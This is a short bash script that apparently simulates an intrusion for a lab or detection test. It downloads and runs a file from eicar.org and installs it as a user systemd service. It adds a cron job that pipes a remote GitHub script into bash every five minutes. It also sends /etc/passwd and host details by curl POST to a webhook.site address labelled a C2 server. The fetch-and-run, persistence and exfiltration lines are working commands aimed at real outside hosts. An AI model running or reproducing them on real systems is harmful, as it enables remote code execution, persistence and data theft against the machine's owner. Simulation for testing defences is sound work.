#!/bin/bash
#Download Malware and run
curl https://secure.eicar.org/eicar.com -o /tmp/payload.bin && chmod +x /tmp/payload.bin && /tmp/payload.bin

#Create Malware service
mkdir -p ~/.config/systemd/user
echo -e '[Unit]\nDescription=payload Lab Service\n\n[Service]\nType=simple\nExecStart=/tmp/payload.bin\nRestart=no\n\n[Install]\nWantedBy=default.target' > ~/.config/systemd/user/payload.service
systemctl --user daemon-reload
systemctl --user start payload.service

#Create crontab download payload.sh file
(crontab -l 2>/dev/null; echo '*/5 * * * * curl https://raw.githubusercontent.com/Baby-Hunter/thor-apt/refs/heads/main/test.sh | bash /dev/null 2>/dev/null') | crontab -

#Exfiltrate data from the machine to a C2 server
cat /etc/passwd | curl -X POST 'https://webhook.site/e1229f93-20a6-4e67-9d24-3a06ba16b080' -H 'Content-Type: text/plain' --data-binary @-

(uname -a; hostnamectl; cat /etc/os-release) | curl -X POST 'https://webhook.site/e1229f93-20a6-4e67-9d24-3a06ba16b080' -H 'Content-Type: text/plain' --data-binary @-
